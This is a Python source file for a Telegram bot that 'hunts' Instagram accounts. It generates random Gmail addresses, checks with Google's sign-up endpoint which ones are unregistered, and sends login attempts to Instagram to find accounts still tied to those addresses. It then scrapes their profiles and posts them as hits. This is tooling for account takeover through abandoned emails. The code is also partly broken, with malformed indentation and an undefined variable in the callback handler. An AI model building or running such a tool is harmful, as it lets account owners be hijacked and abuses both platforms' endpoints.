import requests,user_agent,json,flask,telebot,random,os,sys,faker, names, secrets
import telebot
from uuid import uuid4 
from faker import Faker
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from InstagramIG import *
import json
from flask import Flask, request
r = "1234567890"
uid = uuid4()
bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)


@bot.message_handler(commands=['start'])
def boten(message):
	
    
    
    mas = types.InlineKeyboardMarkup(row_width=2)
    
    A = types.InlineKeyboardButton(text ="CHECK HUNTER INSTAGRAM", callback_data="F1")
    
    E = types.InlineKeyboardButton(text ="SOON... ", callback_data="F1") 
    
    M = types.InlineKeyboardButton('المطور', url='https://t.me/GDO00')
    
    mas.add(A,E,M)
    
    bot.send_message(message.chat.id, f"CHECKER BOT HUNTER EMAILS AND ACCOUNT INSTAGRAM OLD USERS AND 4TH USERS ️",reply_markup=mas)
    
    
@bot.callback_query_handler(func=lambda call: True)
def masg(call):
	
	
	global nam
	
	if call.data =="GDO00":
		
		mas = types.InlineKeyboardMarkup(row_width=2)
		
		A = types.InlineKeyboardButton(text ="CHECK HUNTER INSTAGRAM", callback_data="F1")

		E = types.InlineKeyboardButton(text ="SOON... ", callback_data="F2") 

		M = types.InlineKeyboardButton('المطور', url='https://t.me/GDO00')
		
		M = types.InlineKeyboardButton('المطور', url='https://t.me/GDO00')
		
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id, text="CHECKER BOT HUNTER EMAILS AND ACCOUNT INSTAGRAM OLD USERS AND 4TH USERS ️",reply_markup=mas)

	elif call.data =="F1":
		ok = 0
		sk = 0
		gm = 0
		ins = 0
		ht = 0; bd = 0;bn = 0
		while True:
			u = str("".join(random.choice(r)for i in range(4)))
			n0 = names.get_first_name(gender='male')
			n1 = names.get_first_name()
			n2 = names.get_first_name(gender='femal')
			pa2 = n0 + u 
			pa3 = n1 + u 
			pa4 = n2 + u
			ema = Faker().email().split("@")[0]
			em = (n0,n1,n2,ema,pa2,pa3,pa4)
			emil = random.choice(em)
			azoz = emil+"@gmail.com"
			url = 'https://android.clients.google.com/setup/checkavail'
			h = {'Content-Length':'98','Content-Type':'text/plain; charset=UTF-8','Host':'android.clients.google.com','Connection':'Keep-Alive','user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
			d = json.dumps({'username':azoz,'version':'3','firstName':'AbaLahb','lastName':'AbuJahl'})
			res = requests.post(url,data=d,headers=h)
			if res.json()['status'] == 'SUCCESS':
				url='https://i.instagram.com/api/v1/accounts/login/'
				headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*','Cookie':'missing','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US','X-IG-Capabilities':'3brTvw==','X-IG-Connection-Type':'WIFI','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','Host':'i.instagram.com'}
				data = {'uuid':uid,  'password':'@gdo00bot','username':azoz,'device_id':uid,'from_reg':'false','_csrftoken':'missing','login_attempt_countn':'0'}
				req= requests.post(url, headers=headers, data=data).json()
				if req['message'] == 'The password you entered is incorrect. Please try again.' or req['message'] == 'The password you entered is incorrect. Please try again or log in with Facebook.':
					ht += 1
					try:
						head = {'HOST': "www.instagram.com",'KeepAlive' : 'True','user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",'Cookie': 'cookie','Accept' : "*/*",'ContentType' : "application/x-www-form-urlencoded","X-Requested-With" : "XMLHttpRequest","X-IG-App-ID": "936619743392459","X-Instagram-AJAX" : "missing","X-CSRFToken" : "missing","Accept-Language" : "en-US,en;q=0.9"}
						cookie = secrets.token_hex(8)*2
						user = azoz.split("@")[0]
						i=requests.get(f'https://www.instagram.com/{user}/?__a=1',headers=head).json()
						followers =i['graphql']['user']['edge_followed_by']['count']
						following =i['graphql']['user']['edge_follow']['count']
						id=i['graphql']['user']['id']
						bio = str(i['graphql']['user']['biography'])
						isp = str(i['graphql']['user']['is_private'])
						name = str(i['graphql']['user']['full_name'])
						posts = str(i['graphql']['user']['edge_owner_to_timeline_media']['count'])
						pro = str(i['graphql']['user']['profile_pic_url'])
						lok = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
						iok = lok.json()
						date = str(iok['data'])
						GDO =(f"""⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ ĞĐØ ⌯\n• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •\n⌯ ɴᴀᴍᴇ » {name}\n⌯ ᴜsᴇʀɴᴀᴍᴇ » {user}\n⌯ ᴇᴍᴀɪʟ » {azoz}\n⌯ ғᴏʟʟᴏᴡᴇʀs » {followers}\n⌯ ғᴏʟʟᴏᴡɪɴɢ » {following}\n⌯ ᴅᴀᴛᴇ » {date}\n⌯ ɪᴅ » {id}\n⌯ ᴘᴏsᴛs » {posts}\n⌯ ᴘʀɪvᴀᴛᴇ » {isp}\n⌯ ʙɪᴏ » {bio}\n⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}\n• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •\n◔͜͡◔ ʙʏ » @GDO00 - @GDO_0 .""")
						bot.send_photo(message.chat.id,pro,GDO)
					except:
					bot.send_message(message.chat.id,text=f"""\n⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ ĞĐØ ⌯\n• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •\n⌯ ᴇᴍᴀɪʟ » {azoz}\n• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •\n◔͜͡◔ ʙʏ » @GDOTools .""")
				else:
					bn += 1
 		 	else:
 		 		bd += 1
 		 		h = types.InlineKeyboardMarkup()
 		 		dd = types.InlineKeyboardButton(text = " 𝗱𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 ◔͜͡◔", url = "t.me/GDO00BOT")
 		 		sd = types.InlineKeyboardButton(text ="• 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 •" , url = "t.me/GDOTools")
 		 		h.add(dd,sd)
 		 		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=f"""\n⌯ 𝙲𝙷ea𝚔 ᴇᴍᴀɪʟ 𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 ⸙\n•━━━━━━━━━━━━━━•\n▩ 𝙷𝙸𝚃 » {ht}\n▩ 𝙱𝙰𝙳 » {bd}\n▩ 𝙱𝙰𝙽 » {bn}\n▩ ᴇᴍᴀɪʟ » {azoz}\n•━━━━━━━━━━━━━━•""",parse_mode = "markdown",reply_markup=h)
 			

	elif call.data =="F2":
		    bot.send_message(message.chat.id, f" FUCTION SOON ️",reply_markup=mas)
@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://bothunterinsta.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
